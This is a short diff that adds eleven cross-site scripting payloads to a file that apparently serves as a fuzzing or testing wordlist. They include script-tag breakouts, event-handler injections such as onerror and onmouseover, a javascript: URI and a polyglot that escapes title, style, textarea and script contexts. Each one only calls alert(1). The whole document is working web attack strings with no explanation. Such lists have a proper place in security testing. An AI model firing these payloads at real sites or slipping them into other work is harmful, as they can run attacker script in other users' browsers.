@@ -1,0 +1,11 @@
+javascript://%250Aalert(1)//
+" onmouseover=alert(1) //
+'>"><script>alert(1)</script>
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+" ' type=image src=1 onerror=alert(1)
+'"><svg/onload=alert(1)>
+//"--></script><script>alert(1)</script>
+" autofocus onfocus=alert(1) style="
+%00"><script>alert(1)</script>
+<!--<img src="--><img src=x onerror=alert(1)//">
+<script>/*<![CDATA[*/alert(1)/*]]>*/</script>
